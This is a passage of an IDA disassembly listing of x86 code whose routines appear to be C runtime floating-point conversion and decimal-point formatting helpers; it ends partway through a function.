loc_41B159:                             ; CODE XREF: sub_41AE9C+2B7↑j
                mov     [ebp+arg_0], 1

loc_41B160:                             ; CODE XREF: sub_41AE9C+2BB↑j
                mov     [ecx], edi
                mov     ecx, [ebp+arg_0]
                jmp     short loc_41B186
; ---------------------------------------------------------------------------

loc_41B167:                             ; CODE XREF: sub_41AE9C+2EB↓j
                test    ecx, ecx
                jz      short loc_41B189
                lea     ecx, [ebp+eax*4+var_20]
                mov     edx, [ecx]
                lea     esi, [edx+1]
                xor     edi, edi
                cmp     esi, edx
                jb      short loc_41B17F
                cmp     esi, 1
                jnb     short loc_41B182

loc_41B17F:                             ; CODE XREF: sub_41AE9C+2DC↑j
                xor     edi, edi
                inc     edi

loc_41B182:                             ; CODE XREF: sub_41AE9C+2E1↑j
                mov     [ecx], esi
                mov     ecx, edi

loc_41B186:                             ; CODE XREF: sub_41AE9C+2C9↑j
                dec     eax
                jns     short loc_41B167

loc_41B189:                             ; CODE XREF: sub_41AE9C+265↑j
                                        ; sub_41AE9C+285↑j ...
                mov     ecx, [ebp+var_10]
                or      eax, 0FFFFFFFFh
                shl     eax, cl
                and     [ebx], eax
                mov     eax, [ebp+var_C]
                inc     eax
                cmp     eax, 3
                jge     short loc_41B1A9
                push    3
                pop     ecx
                lea     edi, [ebp+eax*4+var_20]
                sub     ecx, eax
                xor     eax, eax
                rep stosd

loc_41B1A9:                             ; CODE XREF: sub_41AE9C+2FE↑j
                mov     ecx, dword_425F4C
                inc     ecx
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B1CA
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B1CA:                             ; CODE XREF: sub_41AE9C+327↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B1E5:                             ; CODE XREF: sub_41AE9C+374↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B1E5
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B21F:                             ; CODE XREF: sub_41AE9C+39A↓j
                cmp     edx, eax
                jl      short loc_41B22B
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B230
; ---------------------------------------------------------------------------

loc_41B22B:                             ; CODE XREF: sub_41AE9C+385↑j
                and     [ebp+edx*4+var_20], 0

loc_41B230:                             ; CODE XREF: sub_41AE9C+38D↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B21F

loc_41B238:                             ; CODE XREF: sub_41AE9C+18A↑j
                push    2
                xor     ebx, ebx
                pop     eax
                jmp     loc_41B39C
; ---------------------------------------------------------------------------

loc_41B242:                             ; CODE XREF: sub_41AE9C+191↑j
                cmp     ebx, dword_425F40
                mov     ecx, dword_425F4C
                jl      loc_41B301
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                stosd
                or      [ebp+var_20], 80000000h
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B27D
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B27D:                             ; CODE XREF: sub_41AE9C+3DA↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B298:                             ; CODE XREF: sub_41AE9C+427↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B298
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B2D2:                             ; CODE XREF: sub_41AE9C+44D↓j
                cmp     edx, eax
                jl      short loc_41B2DE
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B2E3
; ---------------------------------------------------------------------------

loc_41B2DE:                             ; CODE XREF: sub_41AE9C+438↑j
                and     [ebp+edx*4+var_20], 0

loc_41B2E3:                             ; CODE XREF: sub_41AE9C+440↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B2D2
                mov     eax, dword_425F40
                mov     ecx, dword_425F54
                lea     ebx, [ecx+eax]
                xor     eax, eax
                inc     eax
                jmp     loc_41B39C
; ---------------------------------------------------------------------------

loc_41B301:                             ; CODE XREF: sub_41AE9C+3B2↑j
                mov     eax, dword_425F54
                and     [ebp+var_20], 7FFFFFFFh
                add     ebx, eax
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B329
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B329:                             ; CODE XREF: sub_41AE9C+486↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      esi, 0FFFFFFFFh
                mov     ecx, edx
                shl     esi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     esi

loc_41B344:                             ; CODE XREF: sub_41AE9C+4D6↓j
                mov     ecx, [ebp+arg_0]
                mov     edi, [ebp+ecx*4+var_20]
                mov     ecx, edi
                and     ecx, esi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     edi, cl
                mov     ecx, [ebp+arg_0]
                or      edi, [ebp+var_C]
                mov     [ebp+ecx*4+var_20], edi
                mov     edi, [ebp+var_10]
                mov     ecx, [ebp+var_4]
                shl     edi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], edi
                jl      short loc_41B344
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B381:                             ; CODE XREF: sub_41AE9C+4FC↓j
                cmp     edx, eax
                jl      short loc_41B38D
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B392
; ---------------------------------------------------------------------------

loc_41B38D:                             ; CODE XREF: sub_41AE9C+4E7↑j
                and     [ebp+edx*4+var_20], 0

loc_41B392:                             ; CODE XREF: sub_41AE9C+4EF↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B381
                xor     eax, eax

loc_41B39C:                             ; CODE XREF: sub_41AE9C+3A1↑j
                                        ; sub_41AE9C+460↑j
                pop     esi

loc_41B39D:                             ; CODE XREF: sub_41AE9C+57↑j
                                        ; sub_41AE9C+67↑j
                push    1Fh
                pop     ecx
                sub     ecx, dword_425F4C
                shl     ebx, cl
                mov     ecx, [ebp+var_14]
                neg     ecx
                sbb     ecx, ecx
                and     ecx, 80000000h
                or      ebx, ecx
                mov     ecx, dword_425F50
                or      ebx, [ebp+var_20]
                cmp     ecx, 40h
                jnz     short loc_41B3D2
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+var_1C]
                mov     [ecx+4], ebx
                mov     [ecx], edx
                jmp     short loc_41B3DC
; ---------------------------------------------------------------------------

loc_41B3D2:                             ; CODE XREF: sub_41AE9C+527↑j
                cmp     ecx, 20h
                jnz     short loc_41B3DC
                mov     ecx, [ebp+arg_4]
                mov     [ecx], ebx

loc_41B3DC:                             ; CODE XREF: sub_41AE9C+534↑j
                                        ; sub_41AE9C+539↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_41AE9C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41B3E0      proc near               ; CODE XREF: sub_41D045+46↓p

var_2C          = byte ptr -2Ch
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 2Ch
                mov     eax, [ebp+arg_0]
                movzx   ecx, word ptr [eax+0Ah]
                push    ebx
                mov     ebx, ecx
                and     ecx, 8000h
                mov     [ebp+var_14], ecx
                mov     ecx, [eax+6]
                mov     [ebp+var_20], ecx
                mov     ecx, [eax+2]
                movzx   eax, word ptr [eax]
                and     ebx, 7FFFh
                sub     ebx, 3FFFh
                shl     eax, 10h
                push    edi
                mov     [ebp+var_1C], ecx
                mov     [ebp+var_18], eax
                cmp     ebx, 0FFFFC001h
                jnz     short loc_41B44C
                xor     ebx, ebx
                xor     eax, eax

loc_41B429:                             ; CODE XREF: sub_41B3E0+53↓j
                cmp     [ebp+eax*4+var_20], ebx
                jnz     short loc_41B43C
                inc     eax
                cmp     eax, 3
                jl      short loc_41B429
                xor     eax, eax
                jmp     loc_41B8E1
; ---------------------------------------------------------------------------

loc_41B43C:                             ; CODE XREF: sub_41B3E0+4D↑j
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                push    2
                stosd
                pop     eax
                jmp     loc_41B8E1
; ---------------------------------------------------------------------------

loc_41B44C:                             ; CODE XREF: sub_41B3E0+43↑j
                and     [ebp+arg_0], 0
                push    esi
                lea     esi, [ebp+var_20]
                lea     edi, [ebp+var_2C]
                movsd
                movsd
                movsd
                mov     esi, dword_425F60
                dec     esi
                lea     ecx, [esi+1]
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                sar     eax, 5
                mov     edx, ecx
                and     edx, 8000001Fh
                mov     [ebp+var_10], ebx
                mov     [ebp+var_C], eax
                jns     short loc_41B484
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B484:                             ; CODE XREF: sub_41B3E0+9D↑j
                lea     edi, [ebp+eax*4+var_20]
                push    1Fh
                xor     eax, eax
                pop     ecx
                sub     ecx, edx
                inc     eax
                shl     eax, cl
                mov     [ebp+var_8], ecx
                test    [edi], eax
                jz      loc_41B52A
                mov     eax, [ebp+var_C]
                or      edx, 0FFFFFFFFh
                shl     edx, cl
                not     edx
                test    [ebp+eax*4+var_20], edx
                jmp     short loc_41B4B2
; ---------------------------------------------------------------------------

loc_41B4AD:                             ; CODE XREF: sub_41B3E0+D8↓j
                cmp     [ebp+eax*4+var_20], 0

loc_41B4B2:                             ; CODE XREF: sub_41B3E0+CB↑j
                jnz     short loc_41B4BC
                inc     eax
                cmp     eax, 3
                jl      short loc_41B4AD
                jmp     short loc_41B52A
; ---------------------------------------------------------------------------

loc_41B4BC:                             ; CODE XREF: sub_41B3E0:loc_41B4B2↑j
                mov     eax, esi
                cdq
                push    1Fh
                pop     ecx
                and     edx, ecx
                add     eax, edx
                sar     eax, 5
                and     esi, 8000001Fh
                jns     short loc_41B4D6
                dec     esi
                or      esi, 0FFFFFFE0h
                inc     esi

loc_41B4D6:                             ; CODE XREF: sub_41B3E0+EF↑j
                and     [ebp+var_4], 0
                sub     ecx, esi
                xor     edx, edx
                inc     edx
                shl     edx, cl
                lea     ecx, [ebp+eax*4+var_20]
                mov     esi, [ecx]
                add     esi, edx
                mov     [ebp+arg_0], esi
                mov     esi, [ecx]
                cmp     [ebp+arg_0], esi
                jb      short loc_41B515
                cmp     [ebp+arg_0], edx
                jmp     short loc_41B513
; ---------------------------------------------------------------------------

loc_41B4F8:                             ; CODE XREF: sub_41B3E0+145↓j
                test    ecx, ecx
                jz      short loc_41B527
                and     [ebp+var_4], 0
                lea     ecx, [ebp+eax*4+var_20]
                mov     edx, [ecx]
                lea     esi, [edx+1]
                mov     [ebp+arg_0], esi
                cmp     esi, edx
                jb      short loc_41B515
                cmp     esi, 1

loc_41B513:                             ; CODE XREF: sub_41B3E0+116↑j
                jnb     short loc_41B51C

loc_41B515:                             ; CODE XREF: sub_41B3E0+111↑j
                                        ; sub_41B3E0+12E↑j
                mov     [ebp+var_4], 1

loc_41B51C:                             ; CODE XREF: sub_41B3E0:loc_41B513↑j
                dec     eax
                mov     edx, [ebp+arg_0]
                mov     [ecx], edx
                mov     ecx, [ebp+var_4]
                jns     short loc_41B4F8

loc_41B527:                             ; CODE XREF: sub_41B3E0+11A↑j
                mov     [ebp+arg_0], ecx

loc_41B52A:                             ; CODE XREF: sub_41B3E0+B7↑j
                                        ; sub_41B3E0+DA↑j
                mov     ecx, [ebp+var_8]
                or      eax, 0FFFFFFFFh
                shl     eax, cl
                and     [edi], eax
                mov     eax, [ebp+var_C]
                inc     eax
                cmp     eax, 3
                jge     short loc_41B54A
                push    3
                pop     ecx
                lea     edi, [ebp+eax*4+var_20]
                sub     ecx, eax
                xor     eax, eax
                rep stosd

loc_41B54A:                             ; CODE XREF: sub_41B3E0+15B↑j
                cmp     [ebp+arg_0], 0
                jz      short loc_41B551
                inc     ebx

loc_41B551:                             ; CODE XREF: sub_41B3E0+16E↑j
                mov     eax, dword_425F5C
                mov     ecx, eax
                sub     ecx, dword_425F60
                cmp     ebx, ecx
                jge     short loc_41B56F
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                stosd
                jmp     loc_41B77C
; ---------------------------------------------------------------------------

loc_41B56F:                             ; CODE XREF: sub_41B3E0+180↑j
                cmp     ebx, eax
                jg      loc_41B786
                sub     eax, [ebp+var_10]
                lea     esi, [ebp+var_2C]
                mov     ecx, eax
                lea     edi, [ebp+var_20]
                movsd
                cdq
                and     edx, 1Fh
                add     eax, edx
                movsd
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                movsd
                jns     short loc_41B59D
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B59D:                             ; CODE XREF: sub_41B3E0+1B6↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B5B8:                             ; CODE XREF: sub_41B3E0+203↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B5B8
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B5F2:                             ; CODE XREF: sub_41B3E0+229↓j
                cmp     edx, eax
                jl      short loc_41B5FE
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B603
; ---------------------------------------------------------------------------

loc_41B5FE:                             ; CODE XREF: sub_41B3E0+214↑j
                and     [ebp+edx*4+var_20], 0

loc_41B603:                             ; CODE XREF: sub_41B3E0+21C↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B5F2
                mov     esi, dword_425F60
                dec     esi
                lea     ecx, [esi+1]
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                sar     eax, 5
                mov     edx, ecx
                and     edx, 8000001Fh
                mov     [ebp+var_C], eax
                jns     short loc_41B632
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B632:                             ; CODE XREF: sub_41B3E0+24B↑j
                push    1Fh
                pop     ecx
                sub     ecx, edx
                xor     edx, edx
                inc     edx
                shl     edx, cl
                lea     ebx, [ebp+eax*4+var_20]
                mov     [ebp+var_10], ecx
                test    [ebx], edx
                jz      loc_41B6CD
                or      edx, 0FFFFFFFFh
                shl     edx, cl
                not     edx
                test    [ebp+eax*4+var_20], edx
                jmp     short loc_41B65D
; ---------------------------------------------------------------------------

loc_41B658:                             ; CODE XREF: sub_41B3E0+283↓j
                cmp     [ebp+eax*4+var_20], 0

loc_41B65D:                             ; CODE XREF: sub_41B3E0+276↑j
                jnz     short loc_41B667
                inc     eax
                cmp     eax, 3
                jl      short loc_41B658
                jmp     short loc_41B6CD
; ---------------------------------------------------------------------------

loc_41B667:                             ; CODE XREF: sub_41B3E0:loc_41B65D↑j
                mov     eax, esi
                cdq
                push    1Fh
                pop     ecx
                and     edx, ecx
                add     eax, edx
                sar     eax, 5
                and     esi, 8000001Fh
                jns     short loc_41B681
                dec     esi
                or      esi, 0FFFFFFE0h
                inc     esi

loc_41B681:                             ; CODE XREF: sub_41B3E0+29A↑j
                and     [ebp+arg_0], 0
                xor     edx, edx
                sub     ecx, esi
                inc     edx
                shl     edx, cl
                lea     ecx, [ebp+eax*4+var_20]
                mov     esi, [ecx]
                lea     edi, [esi+edx]
                cmp     edi, esi
                jb      short loc_41B69D
                cmp     edi, edx
                jnb     short loc_41B6A4

loc_41B69D:                             ; CODE XREF: sub_41B3E0+2B7↑j
                mov     [ebp+arg_0], 1

loc_41B6A4:                             ; CODE XREF: sub_41B3E0+2BB↑j
                mov     [ecx], edi
                mov     ecx, [ebp+arg_0]
                jmp     short loc_41B6CA
; ---------------------------------------------------------------------------

loc_41B6AB:                             ; CODE XREF: sub_41B3E0+2EB↓j
                test    ecx, ecx
                jz      short loc_41B6CD
                lea     ecx, [ebp+eax*4+var_20]
                mov     edx, [ecx]
                lea     esi, [edx+1]
                xor     edi, edi
                cmp     esi, edx
                jb      short loc_41B6C3
                cmp     esi, 1
                jnb     short loc_41B6C6

loc_41B6C3:                             ; CODE XREF: sub_41B3E0+2DC↑j
                xor     edi, edi
                inc     edi

loc_41B6C6:                             ; CODE XREF: sub_41B3E0+2E1↑j
                mov     [ecx], esi
                mov     ecx, edi

loc_41B6CA:                             ; CODE XREF: sub_41B3E0+2C9↑j
                dec     eax
                jns     short loc_41B6AB

loc_41B6CD:                             ; CODE XREF: sub_41B3E0+265↑j
                                        ; sub_41B3E0+285↑j ...
                mov     ecx, [ebp+var_10]
                or      eax, 0FFFFFFFFh
                shl     eax, cl
                and     [ebx], eax
                mov     eax, [ebp+var_C]
                inc     eax
                cmp     eax, 3
                jge     short loc_41B6ED
                push    3
                pop     ecx
                lea     edi, [ebp+eax*4+var_20]
                sub     ecx, eax
                xor     eax, eax
                rep stosd

loc_41B6ED:                             ; CODE XREF: sub_41B3E0+2FE↑j
                mov     ecx, dword_425F64
                inc     ecx
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B70E
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B70E:                             ; CODE XREF: sub_41B3E0+327↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B729:                             ; CODE XREF: sub_41B3E0+374↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B729
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B763:                             ; CODE XREF: sub_41B3E0+39A↓j
                cmp     edx, eax
                jl      short loc_41B76F
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B774
; ---------------------------------------------------------------------------

loc_41B76F:                             ; CODE XREF: sub_41B3E0+385↑j
                and     [ebp+edx*4+var_20], 0

loc_41B774:                             ; CODE XREF: sub_41B3E0+38D↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B763

loc_41B77C:                             ; CODE XREF: sub_41B3E0+18A↑j
                push    2
                xor     ebx, ebx
                pop     eax
                jmp     loc_41B8E0
; ---------------------------------------------------------------------------

loc_41B786:                             ; CODE XREF: sub_41B3E0+191↑j
                cmp     ebx, dword_425F58
                mov     ecx, dword_425F64
                jl      loc_41B845
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                stosd
                or      [ebp+var_20], 80000000h
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B7C1
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B7C1:                             ; CODE XREF: sub_41B3E0+3DA↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B7DC:                             ; CODE XREF: sub_41B3E0+427↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B7DC
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B816:                             ; CODE XREF: sub_41B3E0+44D↓j
                cmp     edx, eax
                jl      short loc_41B822
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B827
; ---------------------------------------------------------------------------

loc_41B822:                             ; CODE XREF: sub_41B3E0+438↑j
                and     [ebp+edx*4+var_20], 0

loc_41B827:                             ; CODE XREF: sub_41B3E0+440↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B816
                mov     eax, dword_425F58
                mov     ecx, dword_425F6C
                lea     ebx, [ecx+eax]
                xor     eax, eax
                inc     eax
                jmp     loc_41B8E0
; ---------------------------------------------------------------------------

loc_41B845:                             ; CODE XREF: sub_41B3E0+3B2↑j
                mov     eax, dword_425F6C
                and     [ebp+var_20], 7FFFFFFFh
                add     ebx, eax
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                jns     short loc_41B86D
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B86D:                             ; CODE XREF: sub_41B3E0+486↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      esi, 0FFFFFFFFh
                mov     ecx, edx
                shl     esi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     esi

loc_41B888:                             ; CODE XREF: sub_41B3E0+4D6↓j
                mov     ecx, [ebp+arg_0]
                mov     edi, [ebp+ecx*4+var_20]
                mov     ecx, edi
                and     ecx, esi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     edi, cl
                mov     ecx, [ebp+arg_0]
                or      edi, [ebp+var_C]
                mov     [ebp+ecx*4+var_20], edi
                mov     edi, [ebp+var_10]
                mov     ecx, [ebp+var_4]
                shl     edi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], edi
                jl      short loc_41B888
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B8C5:                             ; CODE XREF: sub_41B3E0+4FC↓j
                cmp     edx, eax
                jl      short loc_41B8D1
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B8D6
; ---------------------------------------------------------------------------

loc_41B8D1:                             ; CODE XREF: sub_41B3E0+4E7↑j
                and     [ebp+edx*4+var_20], 0

loc_41B8D6:                             ; CODE XREF: sub_41B3E0+4EF↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B8C5
                xor     eax, eax

loc_41B8E0:                             ; CODE XREF: sub_41B3E0+3A1↑j
                                        ; sub_41B3E0+460↑j
                pop     esi

loc_41B8E1:                             ; CODE XREF: sub_41B3E0+57↑j
                                        ; sub_41B3E0+67↑j
                push    1Fh
                pop     ecx
                sub     ecx, dword_425F64
                shl     ebx, cl
                mov     ecx, [ebp+var_14]
                neg     ecx
                sbb     ecx, ecx
                and     ecx, 80000000h
                or      ebx, ecx
                mov     ecx, dword_425F68
                or      ebx, [ebp+var_20]
                cmp     ecx, 40h
                jnz     short loc_41B916
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+var_1C]
                mov     [ecx+4], ebx
                mov     [ecx], edx
                jmp     short loc_41B920
; ---------------------------------------------------------------------------

loc_41B916:                             ; CODE XREF: sub_41B3E0+527↑j
                cmp     ecx, 20h
                jnz     short loc_41B920
                mov     ecx, [ebp+arg_4]
                mov     [ecx], ebx

loc_41B920:                             ; CODE XREF: sub_41B3E0+534↑j
                                        ; sub_41B3E0+539↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_41B3E0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41B924      proc near               ; CODE XREF: sub_41BAB0+A↓p
                                        ; DATA XREF: sub_4156A4+55↑o

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    esi
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     esi, [ebp+arg_0]
                movsx   eax, byte ptr [esi]
                push    eax
                call    sub_41285E
                cmp     eax, 65h
                jmp     short loc_41B955
; ---------------------------------------------------------------------------

loc_41B949:                             ; CODE XREF: sub_41B924+32↓j
                inc     esi
                movzx   eax, byte ptr [esi]
                push    eax
                call    sub_40EE3C
                test    eax, eax

loc_41B955:                             ; CODE XREF: sub_41B924+23↑j
                pop     ecx
                jnz     short loc_41B949
                movsx   eax, byte ptr [esi]
                push    eax
                call    sub_41285E
                pop     ecx
                cmp     eax, 78h
                jnz     short loc_41B969
                inc     esi
                inc     esi

loc_41B969:                             ; CODE XREF: sub_41B924+41↑j
                mov     ecx, [ebp+var_10]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                mov     al, [esi]
                mov     cl, [ecx]
                mov     [esi], cl
                inc     esi

loc_41B97B:                             ; CODE XREF: sub_41B924+62↓j
                mov     cl, [esi]
                mov     [esi], al
                mov     al, cl
                mov     cl, [esi]
                inc     esi
                test    cl, cl
                jnz     short loc_41B97B
                pop     esi
                cmp     [ebp+var_4], cl
                jz      short locret_41B995
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

locret_41B995:                          ; CODE XREF: sub_41B924+68↑j
                leave
                retn
sub_41B924      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41B997      proc near               ; CODE XREF: sub_41BAC3+A↓p
                                        ; DATA XREF: sub_4156A4+4B↑o

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    esi
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+arg_0]
                mov     cl, [eax]
                mov     esi, [ebp+var_10]
                test    cl, cl
                jz      short loc_41B9CC
                mov     edx, [esi+0BCh]
                mov     edx, [edx]
                mov     dl, [edx]

loc_41B9C1:                             ; CODE XREF: sub_41B997+33↓j
                cmp     cl, dl
                jz      short loc_41B9CC
                inc     eax
                mov     cl, [eax]
                test    cl, cl
                jnz     short loc_41B9C1

loc_41B9CC:                             ; CODE XREF: sub_41B997+1E↑j
                                        ; sub_41B997+2C↑j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jz      short loc_41BA09
                jmp     short loc_41B9E0
; ---------------------------------------------------------------------------

loc_41B9D5:                             ; CODE XREF: sub_41B997+4D↓j
                cmp     cl, 65h
                jz      short loc_41B9E6
                cmp     cl, 45h
                jz      short loc_41B9E6
                inc     eax

loc_41B9E0:                             ; CODE XREF: sub_41B997+3C↑j
                mov     cl, [eax]
                test    cl, cl
                jnz     short loc_41B9D5

